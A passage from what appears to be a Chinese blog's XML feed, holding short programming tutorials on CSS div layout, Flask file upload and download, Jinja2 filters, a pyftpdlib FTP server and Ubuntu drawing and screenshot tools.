      
        <tags>
            
            <tag> ubuntu </tag>
            
            <tag> tree </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>div不换行的方法</title>
      <link href="2020/04/21/2020-04-21-div_nowrap/"/>
      <url>2020/04/21/2020-04-21-div_nowrap/</url>
      
        <content type="html"><![CDATA[<h2 id="div不换行的方法"><a href="#div不换行的方法" class="headerlink" title="div不换行的方法"></a>div不换行的方法</h2><h4 id="float"><a href="#float" class="headerlink" title="float"></a>float</h4><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;div1&quot;</span>&gt;</span>123<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;div2&quot;</span>&gt;</span>456<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">style</span>&gt;</span></span><br><span class="line"><span class="css"><span class="selector-class">.div1</span> &#123;</span></span><br><span class="line">float: left;</span><br><span class="line">&#125;</span><br><span class="line"><span class="css"><span class="selector-class">.div2</span> &#123;</span></span><br><span class="line">float: left;</span><br><span class="line">&#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br></pre></td></tr></table></figure><h4 id="inline-block"><a href="#inline-block" class="headerlink" title="inline-block"></a>inline-block</h4><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;div1&quot;</span>&gt;</span>123<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;div2&quot;</span>&gt;</span>456<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">style</span>&gt;</span></span><br><span class="line"><span class="css"><span class="selector-class">.div1</span> &#123;</span></span><br><span class="line">display: inline-block;</span><br><span class="line">&#125;</span><br><span class="line"><span class="css"><span class="selector-class">.div2</span> &#123;</span></span><br><span class="line">display: inline-block;</span><br><span class="line">&#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br></pre></td></tr></table></figure><h4 id="flex"><a href="#flex" class="headerlink" title="flex"></a>flex</h4><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;parent&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;div1&quot;</span>&gt;</span>123<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;div2&quot;</span>&gt;</span>456<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">style</span>&gt;</span></span><br><span class="line"><span class="css"><span class="selector-class">.parent</span> &#123;</span></span><br><span class="line">display: flex;</span><br><span class="line">&#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 编程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web </tag>
            
            <tag> div </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>flask 实现上传下载</title>
      <link href="2020/04/21/2020-04-21-flask_upload_and_download/"/>
      <url>2020/04/21/2020-04-21-flask_upload_and_download/</url>
      
        <content type="html"><![CDATA[<h2 id="flask-实现文件上传下载"><a href="#flask-实现文件上传下载" class="headerlink" title="flask 实现文件上传下载"></a>flask 实现文件上传下载</h2><p>目录结构</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">├── app.py</span><br><span class="line">├── templates</span><br><span class="line">│   └── upload.html</span><br><span class="line">└── upload</span><br><span class="line">    ├── 1587436281.txt</span><br><span class="line">    └── 1587436366.txt</span><br></pre></td></tr></table></figure><p>app.py</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line">import os</span><br><span class="line">from flask import Flask, render_template, send_from_directory, request, jsonify</span><br><span class="line">import time</span><br><span class="line"></span><br><span class="line">app &#x3D; Flask(__name__)</span><br><span class="line"></span><br><span class="line">UPLOAD_FOLDER &#x3D; &#39;upload&#39;</span><br><span class="line">app.config[&#39;UPLOAD_FOLDER&#39;] &#x3D; UPLOAD_FOLDER  # 设置文件上传的目标文件夹</span><br><span class="line">basedir &#x3D; os.path.abspath(os.path.dirname(__file__))  # 获取当前项目的绝对路径</span><br><span class="line">ALLOWED_EXTENSIONS &#x3D; set([&#39;txt&#39;, &#39;png&#39;, &#39;jpg&#39;, &#39;xls&#39;, &#39;JPG&#39;, &#39;PNG&#39;, &#39;xlsx&#39;, &#39;gif&#39;, &#39;GIF&#39;])  # 允许上传的文件后缀</span><br><span class="line"></span><br><span class="line"># 判断文件是否合法</span><br><span class="line">def allowed_file(filename):</span><br><span class="line">    return &#39;.&#39; in filename and filename.rsplit(&#39;.&#39;, 1)[1] in ALLOWED_EXTENSIONS</span><br><span class="line"></span><br><span class="line"># 具有上传功能的页面</span><br><span class="line">@app.route(&#39;&#x2F;test&#x2F;upload&#39;)</span><br><span class="line">def upload_test():</span><br><span class="line">    return render_template(&#39;upload.html&#39;)</span><br><span class="line"></span><br><span class="line">@app.route(&#39;&#x2F;api&#x2F;upload&#39;, methods&#x3D;[&#39;POST&#39;], strict_slashes&#x3D;False)</span><br><span class="line">def api_upload():</span><br><span class="line">    file_dir &#x3D; os.path.join(basedir, app.config[&#39;UPLOAD_FOLDER&#39;])  # 拼接成合法文件夹地址</span><br><span class="line">    if not os.path.exists(file_dir):</span><br><span class="line">        os.makedirs(file_dir)  # 文件夹不存在就创建</span><br><span class="line">    f&#x3D;request.files[&#39;myfile&#39;]  # 从表单的file字段获取文件，myfile为该表单的name值</span><br><span class="line">    if f and allowed_file(f.filename):  # 判断是否是允许上传的文件类型</span><br><span class="line">        fname&#x3D;f.filename</span><br><span class="line">        ext &#x3D; fname.rsplit(&#39;.&#39;, 1)[1]  # 获取文件后缀</span><br><span class="line">        unix_time &#x3D; int(time.time())</span><br><span class="line">        new_filename &#x3D; str(unix_time)+&#39;.&#39;+ext   # 修改文件名</span><br><span class="line">        f.save(os.path.join(file_dir, new_filename))  #保存文件到upload目录</span><br><span class="line"></span><br><span class="line">        return jsonify(&#123;&quot;errno&quot;: 0, &quot;errmsg&quot;: &quot;上传成功&quot;&#125;)</span><br><span class="line">    else:</span><br><span class="line">        return jsonify(&#123;&quot;errno&quot;: 1001, &quot;errmsg&quot;: &quot;上传失败&quot;&#125;)</span><br><span class="line"></span><br><span class="line">@app.route(&quot;&#x2F;download&#x2F;&lt;path:filename&gt;&quot;)</span><br><span class="line">def downloader(filename):</span><br><span class="line">    dirpath &#x3D; os.path.join(app.root_path, &#39;upload&#39;)  # 这里是下在目录，从工程的根目录写起，比如你要下载static&#x2F;js里面的js文件，这里就要写“static&#x2F;js”</span><br><span class="line">    return send_from_directory(dirpath, filename, as_attachment&#x3D;True)  # as_attachment&#x3D;True 一定要写，不然会变成打开，而不是下载</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if __name__ &#x3D;&#x3D; &#39;__main__&#39;:</span><br><span class="line">#print jdata</span><br><span class="line">  app.run(host&#x3D;&#39;127.0.0.1&#39;,port&#x3D;&#39;5003&#39;,debug&#x3D;True)</span><br></pre></td></tr></table></figure><p>upload.html</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html lang&#x3D;&quot;en&quot;&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta charset&#x3D;&quot;UTF-8&quot;&gt;</span><br><span class="line">    &lt;title&gt;Title&lt;&#x2F;title&gt;</span><br><span class="line">&lt;&#x2F;head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;form id&#x3D;&quot;form1&quot; method&#x3D;&quot;post&quot; action&#x3D;&quot;&#x2F;api&#x2F;upload&quot; enctype&#x3D;&quot;multipart&#x2F;form-data&quot;&gt;</span><br><span class="line">    &lt;div&gt;</span><br><span class="line">        &lt;input id&#x3D;&quot;File1&quot; type&#x3D;&quot;file&quot; name&#x3D;&quot;myfile&quot;&#x2F;&gt;  &lt;!--后台代码中获取文件是通过form的name来标识的--&gt;</span><br><span class="line">        &lt;input type&#x3D;&quot;submit&quot;&gt;提交&lt;&#x2F;input&gt;</span><br><span class="line">    &lt;&#x2F;div&gt;</span><br><span class="line">&lt;&#x2F;form&gt;</span><br><span class="line">&lt;&#x2F;body&gt;</span><br><span class="line">&lt;&#x2F;html&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/MambaInVeins/ImageHosting/master/img/20200424010229.png" alt="Screenshot from 2020-04-21 11-32-42"></p><p><img src="https://raw.githubusercontent.com/MambaInVeins/ImageHosting/master/img/20200424010234.png" alt="Screenshot from 2020-04-21 11-32-50"></p><p><img src="https://raw.githubusercontent.com/MambaInVeins/ImageHosting/master/img/20200424010240.png" alt="Screenshot from 2020-04-21 11-33-08"></p><p>参考自：<a href="https://blog.csdn.net/qq_25730711/article/details/53643758">https://blog.csdn.net/qq_25730711/article/details/53643758</a></p>]]></content>
      
      
      <categories>
          
          <category> 编程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> flask </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>flask 模板过滤器及自定义过滤器的使用</title>
      <link href="2020/04/21/2020-04-21-flask_use_of_template_filters_and_custom_filters/"/>
      <url>2020/04/21/2020-04-21-flask_use_of_template_filters_and_custom_filters/</url>
      
        <content type="html"><![CDATA[<h2 id="flask模板过滤器及自定义过滤器的使用"><a href="#flask模板过滤器及自定义过滤器的使用" class="headerlink" title="flask模板过滤器及自定义过滤器的使用"></a>flask模板过滤器及自定义过滤器的使用</h2>#### flask自带的过滤器**字符串操作** 禁用转义：  {{ '<em>hello</em>' | safe }} 删除标签：  {{ '<em>hello</em>' | striptags }} 首字母大写：  {{ 'hello' | capitalize }} 所有值小写：  {{ 'HELLO' | lower }} 首字母大写：  {{ 'hello world' | title }} 字符串反转：  {{ 'hello' | reverse }} 字符串截断：  {{ 'hello world' | truncate(5) }}**列表操作** 获取列表长度:  {{ [1,2,3,4,5,6] | length }} 列表求和:  {{ [1,2,3,4,5,6] | sum }} 列表排序:  {{ [6,2,3,1,5,4] | sort }}#### 自定义过滤器##### 方式一:通过Flask应用对象的add_template_filter方法<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">def list_reverse(li):</span><br><span class="line">    temp &#x3D; list(li)</span><br><span class="line">    temp.reverse()</span><br><span class="line">    return temp</span><br><span class="line"></span><br><span class="line"># 可以给过滤器器一个名字，如果没有，默认就是函数的名字</span><br><span class="line">app.add_template_filter(list_reverse,&#39;li_reverse&#39;)</span><br></pre></td></tr></table></figure>##### 方式二:通过装饰器来实现自定义过滤器<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"># 使用装饰器事项过滤器，</span><br><span class="line"># 如果不传入参数，默认过滤器名字就是函数的名字    </span><br><span class="line">@app.template_filter()</span><br><span class="line">def my_filter(args):</span><br><span class="line">    temp &#x3D; list(args)</span><br><span class="line">    temp.reverse()</span><br><span class="line">    return temp</span><br></pre></td></tr></table></figure>##### 在html模板中调用过滤器：<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html lang&#x3D;&quot;en&quot;&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta charset&#x3D;&quot;UTF-8&quot;&gt;</span><br><span class="line">    &lt;title&gt;jinjia2模板测试&lt;&#x2F;title&gt;</span><br><span class="line">&lt;&#x2F;head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">    &lt;h1&gt;len: &#123;&#123; [1,2,3,4,5,6] | length &#125;&#125;&lt;&#x2F;h1&gt;   #此处调用上文flask自带的过滤器</span><br><span class="line">    &lt;h1&gt; &#123;&#123; [1,2,3,4,5,6] | my_filter &#125;&#125;&lt;&#x2F;h1&gt;   #此处调用上文自定义过滤器</span><br><span class="line">  </span><br><span class="line">&lt;&#x2F;body&gt;</span><br><span class="line">&lt;&#x2F;html&gt;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 编程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> flask </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>python 一句话搭建ftp服务器</title>
      <link href="2020/04/21/2020-04-21-python_build_ftpserver_in_one_sentence/"/>
      <url>2020/04/21/2020-04-21-python_build_ftpserver_in_one_sentence/</url>
      
        <content type="html"><![CDATA[<h2 id="python-一句话搭建ftp服务器"><a href="#python-一句话搭建ftp服务器" class="headerlink" title="python 一句话搭建ftp服务器"></a>python 一句话搭建ftp服务器</h2><p>当你想快速共享一个目录的时候，利用pyftpdlib可以更加简单的方法即可实现FTP服务器的功能，这是特别有用的，只需要1行代码即可实现。</p><h3 id="一句话搭建FTP服务器"><a href="#一句话搭建FTP服务器" class="headerlink" title="一句话搭建FTP服务器"></a>一句话搭建FTP服务器</h3><p>安装</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pip install pyftpdlib </span><br><span class="line">(安装失败请到这里下载：https:&#x2F;&#x2F;pypi.python.org&#x2F;pypi&#x2F;pyftpdlib&#x2F;)</span><br></pre></td></tr></table></figure><p>到你打算分享的目录下执行</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">python -m pyftpdlib</span><br><span class="line"></span><br><span class="line">python -m pyftpdlib -u user -p 123456 -w</span><br></pre></td></tr></table></figure><p>然后我们来看一下，至此一个简单的FTP服务器已经搭建完成，访问 <a href="ftp://127.0.0.1:2121即可（默认IP为">ftp://127.0.0.1:2121即可（默认IP为</a> 127.0.0.1 、端口为 2121 ）</p><p>除上之外，还有一些可选参数：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">-i 指定IP地址（默认为本机的IP地址）</span><br><span class="line">-p 指定端口（默认为2121）</span><br><span class="line">-w 写权限（默认为只读）</span><br><span class="line">-d 指定目录 （默认为当前目录）</span><br><span class="line">-u 指定用户名登录</span><br><span class="line">-P 设置登录密码</span><br></pre></td></tr></table></figure><h3 id="完善的FTP服务器脚本配置"><a href="#完善的FTP服务器脚本配置" class="headerlink" title="完善的FTP服务器脚本配置"></a>完善的FTP服务器脚本配置</h3><p>上述的一行命令已经可以实现一个简单的FTP服务器，但是要搭建一个功能强大完善的FTP服务所涉及到的配置较多，这时需要使用Pyftpdlib提供的 API 来编写。如下是一个简单的示例</p><p>ftp.py</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">from pyftpdlib.authorizers import DummyAuthorizer</span><br><span class="line">from pyftpdlib.handlers import FTPHandler</span><br><span class="line">from pyftpdlib.servers import FTPServer</span><br><span class="line"> </span><br><span class="line"># 实例化DummyAuthorizer来创建ftp用户</span><br><span class="line">authorizer &#x3D; DummyAuthorizer()</span><br><span class="line"># 参数：用户名，密码，目录，权限</span><br><span class="line">authorizer.add_user(&#39;user1&#39;, &#39;12345&#39;, &#39;&#x2F;test&#x2F;pyftpdlib_FTP&#39;, perm&#x3D;&#39;elradfmwMT&#39;)</span><br><span class="line">authorizer.add_user(&#39;user2&#39;, &#39;12345&#39;, &#39;&#x2F;media&#x2F;mamba&#x2F;Data&#x2F;test&#x2F;pyftpdlib_FTP&#39;, perm&#x3D;&#39;elr&#39;)</span><br><span class="line"># 匿名登录</span><br><span class="line"># authorizer.add_anonymous(&#39;&#x2F;home&#x2F;nobody&#39;)</span><br><span class="line">handler &#x3D; FTPHandler</span><br><span class="line">handler.authorizer &#x3D; authorizer</span><br><span class="line"># 参数：IP，端口，handler</span><br><span class="line">server &#x3D; FTPServer((&#39;192.168.24.145&#39;, 1234), handler)</span><br><span class="line">server.serve_forever()</span><br></pre></td></tr></table></figure><p>运行</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python ftp.py</span><br></pre></td></tr></table></figure><p>perm权限选项**</p><p>读取权限：</p><ul><li>“e” =更改目录（CWD，CDUP命令）</li><li>“l” =列表文件（LIST，NLST，STAT，MLSD，MLST，SIZE命令）</li><li>“r” =从服务器检索文件（RETR命令）  </li></ul><p>写入权限：</p><ul><li><p>“a” =将数据追加到现有文件（APPE命令）</p></li><li><p>“d” =删除文件或目录（DELE，RMD命令）</p></li><li><p>“f” =重命名文件或目录（RNFR，RNTO命令）</p></li><li><p>“m” =创建目录（MKD命令）</p></li><li><p>“w” =将文件存储到服务器（STOR，STOU命令）</p></li><li><p>“M”=更改文件模式/权限（SITE CHMOD命令）</p></li><li><p>“T”=更改文件修改时间（SITE MFMT命令）</p></li></ul><p>参考：Pyftpdlib文档：<a href="http://pyftpdlib.readthedocs.io/en/latest/index.html">http://pyftpdlib.readthedocs.io/en/latest/index.html</a></p>]]></content>
      
      
      <categories>
          
          <category> 编程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python </tag>
            
            <tag> ftp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ubuntu绘图程序Gnome-paint</title>
      <link href="2020/04/21/2020-04-21-ubuntu_drawing_program_Gnome-paint/"/>
      <url>2020/04/21/2020-04-21-ubuntu_drawing_program_Gnome-paint/</url>
      
        <content type="html"><![CDATA[<h2 id="ubuntu绘图程序Gnome-paint"><a href="#ubuntu绘图程序Gnome-paint" class="headerlink" title="ubuntu绘图程序Gnome-paint"></a>ubuntu绘图程序Gnome-paint</h2><p>在ubuntu下写笔记时有时会需要画图、打马，使用了Gnome-paint这个小工具。</p><p>安装</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install gnome-paint</span><br></pre></td></tr></table></figure><p>这是一个GNOME桌面下很简单的绘图应用程序，拥有典型界面和一些其他选项。它提供了基本的功能和两个工具条：一个是用来选择工具，另一个用来选择颜色。</p><p><img src="https://raw.githubusercontent.com/MambaInVeins/ImageHosting/master/img/20200424010416.png" alt="Screenshot from 2020-04-21 02-51-00"></p>]]></content>
      
      
      <categories>
          
          <category> 工具使用 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ubuntu </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ubuntu 自带截图工具screenshot</title>
      <link href="2020/04/21/2020-04-21-ubuntu_screenshot_tool_screenshot/"/>
      <url>2020/04/21/2020-04-21-ubuntu_screenshot_tool_screenshot/</url>
      
        <content type="html"><![CDATA[<h2 id="ubuntu-自带截图工具screenshot"><a href="#ubuntu-自带截图工具screenshot" class="headerlink" title="ubuntu 自带截图工具screenshot"></a>ubuntu 自带截图工具screenshot</h2><p> ubuntu自带的截图工具screenshot能够满足基本的截图功能，可以不必安装另外的截图软件。一般用到的截图类型有三种：全屏、当前活动窗口、自定义区域，可以在Dash home中搜索找到该应用。</p><p><img src="https://raw.githubusercontent.com/MambaInVeins/ImageHosting/master/img/20200424010349.jpeg" alt="img"><br>截取全屏快捷键：print screen<br>截取当前窗口快捷键：alt+print screen（如果遇到无法截图的情况直接用自定义截图好了，不必纠结了）<br>自定义区域截图的快捷键需要自己设置，设置步骤如下：<br>system settings—-&gt;keyboard—–&gt;shortcuts—–&gt;custom shortcuts—–&gt;点击屏幕下方的加号,如下设置</p><p><img src="https://raw.githubusercontent.com/MambaInVeins/ImageHosting/master/img/20200424010353.jpeg" alt="img"></p><p>然后按下Ctrl+Alt+A(要设置的快捷键)</p><p><img src="https://raw.githubusercontent.com/MambaInVeins/ImageHosting/master/img/20200424010358.png" alt="image-20200422093736045"></p>]]></content>
      
      
      <categories>
          
          <category> 工具使用 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ubuntu </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Flask利用bootstrap-table实现表格排序、搜索</title>
      <link href="2020/04/20/2020-04-20-Flask_bootstrap-table_table_sorting_and_searching/"/>
      <url>2020/04/20/2020-04-20-Flask_bootstrap-table_table_sorting_and_searching/</url>
      
        <content type="html"><![CDATA[<h2 id="Flask利用bootstrap-table实现表格排序、搜索"><a href="#Flask利用bootstrap-table实现表格排序、搜索" class="headerlink" title="Flask利用bootstrap-table实现表格排序、搜索"></a>Flask利用bootstrap-table实现表格排序、搜索</h2><h2 id=""><a href="#" class="headerlink" title=""></a></h2><p>需要在flask项目中添加一个表格排序和搜索功能，因为对前端不是很了解，搜索到两款插件bootstrap-table以及DataTable。我采用了bootstrap-table解决了问题，记录如下。</p><p>bootstrap-table是一款表格组件神器，功能比较完备，能够实现数据异步获取，编辑，排序等一系列功能，只需要一些简单的配置就可以实现一个功能完备的在线表格。</p><p>地址：<a href="https://github.com/wenzhixin/bootstrap-table">https://github.com/wenzhixin/bootstrap-table</a></p><p>官方文档地址：<a href="http://bootstrap-table.wenzhixin.net.cn/zh-cn/documentation/">http://bootstrap-table.wenzhixin.net.cn/zh-cn/documentation/</a></p><p>需求：flask调用sql查询到的数据，返回到前端页面表格，并能够进行排序搜索。</p><p>解决：在static目录中存放需要使用的css/js文件，flask回传查询结果json，在html中利用bootstrap-table插件，进行配置，并显示数据，实现排序、查询、翻页等功能。</p><p>文件目录</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">├── app.py</span><br><span class="line">├── static</span><br><span class="line">│   ├── bootstrap.min.css</span><br><span class="line">│   ├── bootstrap.min.js</span><br><span class="line">│   ├── bootstrap-table.min.css</span><br><span class="line">│   ├── bootstrap-table.min.js</span><br><span class="line">│   ├── jquery-1.12.4.js</span><br><span class="line">│   └── jquery-2.2.4.min.js</span><br><span class="line">└── templates</span><br><span class="line">    └── table.html</span><br></pre></td></tr></table></figure><p>app.py</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line">from flask import Flask, render_template</span><br><span class="line">import json</span><br><span class="line"></span><br><span class="line">&quot;&quot;&quot;</span><br><span class="line">A example for creating a Table that is sortable by its header</span><br><span class="line">&quot;&quot;&quot;</span><br><span class="line"></span><br><span class="line">app &#x3D; Flask(__name__,static_url_path&#x3D;&#39;&#39;)</span><br><span class="line">data &#x3D; [&#123;</span><br><span class="line">  &quot;来源&quot;: &quot;bootstrdap-table&quot;,</span><br><span class="line">  &quot;标题&quot;: &quot;11&quot;,</span><br><span class="line">  &quot;发布日期&quot;: &quot;2020-04-17&quot;,</span><br><span class="line">&#125;,</span><br><span class="line"> &#123;</span><br><span class="line">  &quot;来源&quot;: &quot;fxcvbootstrap-tacvxczvble&quot;,</span><br><span class="line">  &quot;标题&quot;: &quot;10&quot;,</span><br><span class="line">  &quot;发布日期&quot;: &quot;2020-04-19&quot;,</span><br><span class="line">&#125;, &#123;</span><br><span class="line">  &quot;来源&quot;: &quot;adsfasdbasfootszxvtrap-table&quot;,</span><br><span class="line">  &quot;标题&quot;: &quot;12&quot;,</span><br><span class="line">  &quot;发布日期&quot;: &quot;2020-04-18&quot;,</span><br><span class="line">&#125;]</span><br><span class="line"># other column settings -&gt; http:&#x2F;&#x2F;bootstrap-table.wenzhixin.net.cn&#x2F;documentation&#x2F;#column-options</span><br><span class="line">columns &#x3D; [</span><br><span class="line">  &#123;</span><br><span class="line">    &quot;field&quot;: &quot;来源&quot;, # which is the field&#39;s name of data key </span><br><span class="line">    &quot;title&quot;: &quot;来源&quot;, # display as the table header&#39;s name</span><br><span class="line">    &quot;sortable&quot;: True,</span><br><span class="line">  &#125;,</span><br><span class="line">  &#123;</span><br><span class="line">    &quot;field&quot;: &quot;标题&quot;,</span><br><span class="line">    &quot;title&quot;: &quot;标题&quot;,</span><br><span class="line">    &quot;sortable&quot;: True,</span><br><span class="line">  &#125;,</span><br><span class="line">  &#123;</span><br><span class="line">    &quot;field&quot;: &quot;发布日期&quot;,</span><br><span class="line">    &quot;title&quot;: &quot;发布日期&quot;,</span><br><span class="line">    &quot;sortable&quot;: True,</span><br><span class="line">  &#125;</span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">#jdata&#x3D;json.dumps(data)</span><br><span class="line"></span><br><span class="line">@app.route(&#39;&#x2F;&#39;)</span><br><span class="line">def index():</span><br><span class="line">    return 